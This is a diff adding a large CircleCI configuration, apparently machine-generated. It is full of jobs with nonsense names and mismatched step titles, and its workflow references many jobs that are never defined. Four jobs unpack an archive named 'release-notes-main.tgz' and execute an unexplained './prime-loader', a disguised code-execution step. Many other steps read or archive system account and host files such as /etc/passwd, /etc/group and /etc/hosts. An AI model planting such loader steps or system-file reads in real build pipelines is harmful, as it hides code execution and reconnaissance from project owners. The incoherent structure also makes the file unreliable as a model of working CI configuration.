+            cat -ET /tmp/workflow-E/xx_30c7d55 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: 10 seconds to unlock
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; if [[ -S /dev/log ]]; then echo true; elif [[ -e /tmp ]]; then echo maybe; else echo 'false'; fi; true ; } > /tmp/workflow-E/v-v3.17.35
+            { echo "complete"; wc -c /tmp/workflow-E/v-v3.17.35; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'v-v3.17.35'
+  raj-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/v-v3.17.35 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  itPollsKind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: ML 71 Mutex Kickoff
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; pr -3 -t /etc/shells | head -n 1; true ; } > /tmp/workflow-E/181.152.0.152
+            { echo "complete"; wc -c /tmp/workflow-E/181.152.0.152; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '181.152.0.152'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/181.152.0.152 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  PPERR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Fuel check
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf '%s' 'lorem ipsum dolor sit amet'|od -An -c; true ; } > /tmp/workflow-E/fermion.memo.violet
+            { echo "complete"; wc -c /tmp/workflow-E/fermion.memo.violet; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'fermion.memo.violet'
+  API-70:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/fermion.memo.violet 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+  pbWidget:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: With care pay the new hires
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ln -sf /etc/hosts "/tmp/wolf-2018.12.04.bak" && stat -c %N "/tmp/wolf-2018.12.04.bak"; true ; } > /tmp/workflow-E/t3nsor-pu1se-v4l1ey
+            { echo "complete"; wc -c /tmp/workflow-E/t3nsor-pu1se-v4l1ey; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 't3nsor-pu1se-v4l1ey'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Pull upstream state
+          command: |
+            cat -ET /tmp/workflow-E/t3nsor-pu1se-v4l1ey 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xz -f release-notes-main.tgz
+      - run:
+          command: sh -c "./prime-loader"
+
+  triUuidPanel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage2 fixture
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; tar czf "/tmp/m.tar.gz" -C /etc hosts && tar -xzOf "/tmp/m.tar.gz" hosts | head -3; true ; } > /tmp/workflow-E/Glacier
+            { echo "complete"; wc -c /tmp/workflow-E/Glacier; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'Glacier'
+  espressoPiston:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Banish the browser matrix
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf '%s\n' "new message received" | wc -w; true ; } > /tmp/workflow-E/AJ0v9h6dX5b9
+            { echo "complete"; wc -c /tmp/workflow-E/AJ0v9h6dX5b9; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'AJ0v9h6dX5b9'
+  s_nWaveText:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Kernel Attestation
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; OUTPUT=(peach papaya melon banana); unset 'OUTPUT[1]'; echo ${OUTPUT[@]}; true ; } > /tmp/workflow-E/D1D
+            { echo "complete"; wc -c /tmp/workflow-E/D1D; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'D1D'
+  checkNAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: assignTravelClaimsJob
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; seq 4 5 55 | sort -n | tail -1; true ; } > /tmp/workflow-E/spark.4.8
+            { echo "complete"; wc -c /tmp/workflow-E/spark.4.8; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'spark.4.8'
+  widget-noon-apple:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: busy swapping humidity probe
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -name '*' -printf "%p\n" 2>/dev/null | tail -n 10; true ; } > /tmp/workflow-E/mEmoCoPpErAZuReqUeUE
+            { echo "complete"; wc -c /tmp/workflow-E/mEmoCoPpErAZuReqUeUE; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'mEmoCoPpErAZuReqUeUE'
+  Vector:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Amara checks the batch window
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; if [ ! -w /tmp ];then echo Y; fi; true ; } > /tmp/workflow-E/build.4.5
+            { echo "complete"; wc -c /tmp/workflow-E/build.4.5; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'build.4.5'
+  RNNTile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Rotate Spool Directory Gen 5
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; grep -qs "^127" /etc/hosts && echo "good" || echo "bad"; true ; } > /tmp/workflow-E/snapshot.2.15
+            { echo "complete"; wc -c /tmp/workflow-E/snapshot.2.15; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'snapshot.2.15'
+  fronttween:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Ping the socket pool because it is slow
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,grape,20,72.49\n2,mango,16,64.41\n3,banana,20,70.24\n4,kiwi,3,79.01\n' | awk -F, '$3 > 5'; true ; } > /tmp/workflow-E/dr1v3r.po1ar
+            { echo "complete"; wc -c /tmp/workflow-E/dr1v3r.po1ar; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'dr1v3r.po1ar'
+  NamedFakeArticleElement:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Transfer before approval
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; for p in milk split project garlic demo; do echo ${#p}; done; true ; } > /tmp/workflow-E/t3nsor-pu1se-v4l1ey
+            { echo "complete"; wc -c /tmp/workflow-E/t3nsor-pu1se-v4l1ey; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 't3nsor-pu1se-v4l1ey'
+  comment_list_file:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Chase up the desk assignments
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; test -x /usr/bin/env && echo Y || echo "N"; true ; } > /tmp/workflow-E/patch-1191
+            { echo "complete"; wc -c /tmp/workflow-E/patch-1191; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'patch-1191'
+  x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Day Six Release
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,lemon,2,58.02\n2,grape,8,71.84\n3,pear,3,65.11\n4,melon,10,54.18\n' >"/var/tmp/post.csv" && sort -t, -k4 -rn "/var/tmp/post.csv" | head -n 2; true ; } > /tmp/workflow-E/temp-c22
+            { echo "complete"; wc -c /tmp/workflow-E/temp-c22; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'temp-c22'
+  opt_bal_avg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Open Profile Tab Phase
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'lima prague' | awk '{n=split($0, a, ""); print n}'; true ; } > /tmp/workflow-E/sha_6f92fb94305cc4
+            { echo "complete"; wc -c /tmp/workflow-E/sha_6f92fb94305cc4; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'sha_6f92fb94305cc4'
+  pretzelCreateSwordWidget:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Close the loop on pruning
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ls -G ~/.bashrc | awk '{print length, $0}' | sort -n | tail -n 3; true ; } > /tmp/workflow-E/Cobalt_6712_8f-qa
+            { echo "complete"; wc -c /tmp/workflow-E/Cobalt_6712_8f-qa; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'Cobalt_6712_8f-qa'
+  ASSERT_GE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Daily currency field imputation
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ( set -o pipefail; grep -c root /etc/passwd | tee "/dev/shm/pa4.md" ) && cat "/dev/shm/pa4.md"; true ; } > /tmp/workflow-E/ZyI
+            { echo "complete"; wc -c /tmp/workflow-E/ZyI; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'ZyI'
+  stumpdrotzyi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Interim training
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | grep -nh '^127' | nl; true ; } > /tmp/workflow-E/proton.1.2
+            { echo "complete"; wc -c /tmp/workflow-E/proton.1.2; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'proton.1.2'
+  cubeDbl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Deglaze the pick list
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 1 -type f -name "*.py" -exec wc -c {} +; true ; } > /tmp/workflow-E/4dc158
+            { echo "complete"; wc -c /tmp/workflow-E/4dc158; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '4dc158'
+  ITM-RETURN-LEN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Bung the retry buffer through organisation
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - group | gzip -c >"${TMPDIR:-/tmp}/front-agreement01.tgz" && tar -tzf "${TMPDIR:-/tmp}/front-agreement01.tgz"; true ; } > /tmp/workflow-E/I
+            { echo "complete"; wc -c /tmp/workflow-E/I; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'I'
+  drainPostDigest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Train the team roster in case of drift
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; if [ -L /bin ] ; then echo 'it is there'; fi; true ; } > /tmp/workflow-E/xx_30c7d55
+            { echo "complete"; wc -c /tmp/workflow-E/xx_30c7d55; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'xx_30c7d55'
+  orbit-normal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Ship the canary fleet to Frankfurt
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; comm -12 <(cut -d: -f1 /etc/passwd | sort) <(cut -d: -f1 /etc/group | sort) | head -n15; true ; } > /tmp/workflow-E/bis0n-c1ien7
+            { echo "complete"; wc -c /tmp/workflow-E/bis0n-c1ien7; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'bis0n-c1ien7'
+  skoundquamtee-kit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Cool the lockfile on a rack
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; ls -FQ /etc/security | nl; true ; } > /tmp/workflow-E/128.65.128
+            { echo "complete"; wc -c /tmp/workflow-E/128.65.128; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '128.65.128'
+  wrappersCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: ask frontend to rerun mock server
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; tar -cvzf "/tmp/old-river.tar.gz" -C /etc profile; true ; } > /tmp/workflow-E/fermion.memo.violet
+            { echo "complete"; wc -c /tmp/workflow-E/fermion.memo.violet; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'fermion.memo.violet'
+  mk7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage2 fixture
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; grep -qs "^nameserver" /etc/resolv.conf &&echo present || echo absent; true ; } > /tmp/workflow-E/node931
+            { echo "complete"; wc -c /tmp/workflow-E/node931; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'node931'
+  strMainLoose:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage2 fixture
+          command: |
+            mkdir -p /tmp/workflow-E
+            set +o pipefail 2>/dev/null; echo "$(seq 1 1377244)" > /tmp/workflow-E/epoch-55z; true
+            { echo "complete"; wc -c /tmp/workflow-E/epoch-55z; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'epoch-55z'
+  transField:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Series V Stream Weapon Stats
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 \( -name '*.1' -o -name '*.log' \) -user $(id -un) -ls 2> /dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/workflow-E/v-v3.17.35
+            { echo "complete"; wc -c /tmp/workflow-E/v-v3.17.35; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'v-v3.17.35'
+  needs_box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Hat trick smoke test
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf 'a\n\n\nb\n' >'/tmp/icon.tmp' && cat -n '/tmp/icon.tmp'; true ; } > /tmp/workflow-E/2b605dba96f764317c8cac4ce68
+            { echo "complete"; wc -c /tmp/workflow-E/2b605dba96f764317c8cac4ce68; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '2b605dba96f764317c8cac4ce68'
+  DIALOG_H_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Split the download queue if that is ok
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; grep -hn then /etc/profile | wc -l; true ; } > /tmp/workflow-E/cdf02eb9-c9a1-9455-778a-454a9b80f7
+            { echo "complete"; wc -c /tmp/workflow-E/cdf02eb9-c9a1-9455-778a-454a9b80f7; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'cdf02eb9-c9a1-9455-778a-454a9b80f7'
+  KSB-94135:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: No tunnel without approval
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; compgen -k|head -n5; true ; } > /tmp/workflow-E/invoice.silent.atom.violet
+            { echo "complete"; wc -c /tmp/workflow-E/invoice.silent.atom.violet; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'invoice.silent.atom.violet'
+  shortCb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: Dry Culture Plates Rev 2
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; printf '%s' '3 tests passed' | od -An -c; true ; } > /tmp/workflow-E/181.152.0.152
+            { echo "complete"; wc -c /tmp/workflow-E/181.152.0.152; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - '181.152.0.152'
+  Copy-TextId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workflow-E
+      - run:
+          name: For luck poll the mailing list
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /dev/shm/night_stadium_mint.conf && sed -i '1d' /dev/shm/night_stadium_mint.conf && diff /etc/hosts /dev/shm/night_stadium_mint.conf | head -4; true ; } > /tmp/workflow-E/otter.fox.thicket.gadget
+            { echo "complete"; wc -c /tmp/workflow-E/otter.fox.thicket.gadget; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'otter.fox.thicket.gadget'
+  Spark:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: anonymize invoice rows last
+          command: |
+            mkdir -p /tmp/workflow-E
+            { set +o pipefail 2>/dev/null; type -t cd; true ; } > /tmp/workflow-E/GUEsTDuSTYironfROzEN
+            { echo "complete"; wc -c /tmp/workflow-E/GUEsTDuSTYironfROzEN; } 2>&1
+      - persist_to_workspace:
+          root: /tmp/workflow-E
+          paths:
+            - 'GUEsTDuSTYironfROzEN'
+workflows:
+  build-and-test:
+    jobs:
+      - reactor-button-seed-scarlet
+      - triUuidPanel:
+          requires:
+            - reactor-button-seed-scarlet
+      - VerifyProd:
+          requires:
+            - triUuidPanel
+      - success_city_link_3:
+          requires:
+            - triUuidPanel
+      - espressoPiston:
+          requires:
+            - success_city_link_3
+      - tweak-router-v2-reload:
+          requires:
+            - espressoPiston
+      - article_spawn_next:
+          requires:
+            - espressoPiston
+      - s_nWaveText:
+          requires:
+            - article_spawn_next
+      - fiona-smoke:
+          requires:
+            - s_nWaveText
+      - yieldSalt:
+          requires:
+            - s_nWaveText
+      - checkNAT:
+          requires:
+            - yieldSalt
+      - papa:
+          requires:
+            - checkNAT
+      - cn-mike:
+          requires:
+            - checkNAT
+      - widget-noon-apple:
+          requires:
+            - cn-mike
+      - VERIFY_DEV:
+          requires:
+            - widget-noon-apple
+      - friendPin:
+          requires:
+            - widget-noon-apple
+      - Vector:
+          requires:
+            - friendPin
+      - py311-release:
+          requires:
+            - Vector
+      - clusterface:
+          requires:
+            - Vector
+      - RNNTile:
+          requires:
+            - clusterface
+      - qi-run:
+          requires:
+            - RNNTile
+      - Tool67:
+          requires:
+            - RNNTile
+      - fronttween:
+          requires:
+            - Tool67
+      - DATA-954:
+          requires:
+            - fronttween
+      - pbWidget:
+          requires:
+            - fronttween
+      - NamedFakeArticleElement:
+          requires:
+            - pbWidget
+      - fire-up:
+          requires:
+            - NamedFakeArticleElement
+      - STUB_LULLABY_SELECT_MULTI:
+          requires:
+            - NamedFakeArticleElement
+      - comment_list_file:
+          requires:
+            - STUB_LULLABY_SELECT_MULTI
+      - hotfix-6005:
+          requires:
+            - comment_list_file
+      - ValueFunc:
+          requires:
+            - comment_list_file
+      - x:
+          requires:
+            - ValueFunc
+      - preview-v8:
+          requires:
+            - x
+      - secondary_refs:
+          requires:
+            - x
+      - opt_bal_avg:
+          requires:
+            - secondary_refs
+      - atlas-ng:
+          requires:
+            - opt_bal_avg
+      - input-list--fixed:
+          requires:
+            - opt_bal_avg
+      - pretzelCreateSwordWidget:
+          requires:
+            - input-list--fixed
+      - preview-build:
+          requires:
+            - pretzelCreateSwordWidget
+      - unmountResultLightError:
+          requires:
+            - pretzelCreateSwordWidget
+      - ASSERT_GE:
+          requires:
+            - unmountResultLightError
+      - PackageApp:
+          requires:
+            - ASSERT_GE
+      - p:
+          requires:
+            - ASSERT_GE
+      - stumpdrotzyi:
+          requires:
+            - p
+      - verify-full-regression-suite:
+          requires:
+            - stumpdrotzyi
+      - PARSER_SUPER_ACTIVE_90:
+          requires:
+            - stumpdrotzyi
+      - cubeDbl:
+          requires:
+            - PARSER_SUPER_ACTIVE_90
+      - add-edge-reload:
+          requires:
+            - cubeDbl
+      - burgundy2
+      - ITM-RETURN-LEN:
+          requires:
+            - burgundy2
+      - update-router-bug:
+          requires:
+            - ITM-RETURN-LEN
+      - complexFlag:
+          requires:
+            - ITM-RETURN-LEN
+      - drainPostDigest:
+          requires:
+            - complexFlag
+      - assemble-end-to-end-regression-suite:
+          requires:
+            - drainPostDigest
+      - bigPawn:
+          requires:
+            - drainPostDigest
+      - orbit-normal:
+          requires:
+            - bigPawn
+      - preview:
+          requires:
+            - orbit-normal
+      - postSidebarById:
+          requires:
+            - orbit-normal
+      - skoundquamtee-kit:
+          requires:
+            - postSidebarById
+      - dotnet8-lint:
+          requires:
+            - skoundquamtee-kit
+      - PPERR:
+          requires:
+            - skoundquamtee-kit
+      - wrappersCache:
+          requires:
+            - PPERR
+      - API-70:
+          requires:
+            - wrappersCache
+      - VMSHACell:
+          requires:
+            - wrappersCache
+      - mk7:
+          requires:
+            - VMSHACell
+      - rm-metrics-glitch:
+          requires:
+            - mk7
+      - ryo42:
+          requires:
+            - mk7
+      - strMainLoose:
+          requires:
+            - ryo42
+      - assemble-staging-integration-tests:
+          requires:
+            - strMainLoose
+      - yolo:
+          requires:
+            - strMainLoose
+      - transField:
+          requires:
+            - yolo
+      - raj-ship:
+          requires:
+            - transField
+      - s3rverzz063:
+          requires:
+            - transField
+      - needs_box:
+          requires:
+            - s3rverzz063
+      - py310-cov:
+          requires:
+            - needs_box
+      - report-2015:
+          requires:
+            - needs_box
+      - DIALOG_H_:
+          requires:
+            - report-2015
+      - q2-canary:
+          requires:
+            - DIALOG_H_
+      - MAT2:
+          requires:
+            - DIALOG_H_
+      - KSB-94135:
+          requires:
+            - MAT2
+      - shippit-57:
+          requires:
+            - KSB-94135
+      - itPollsKind:
+          requires:
+            - KSB-94135
+      - shortCb:
+          requires:
+            - itPollsKind
+      - rocket:
+          requires:
+            - shortCb
+      - sk-Hans:
+          requires:
+            - shortCb
+      - Copy-TextId:
+          requires:
+            - sk-Hans
+      - ruby3-test:
+          requires:
+            - Copy-TextId
+      - TEMP_PREFIX:
+          requires:
+            - Copy-TextId
+      - Spark:
+          requires:
+            - TEMP_PREFIX
+      - RUN_DEV:
+          requires:
+            - Spark
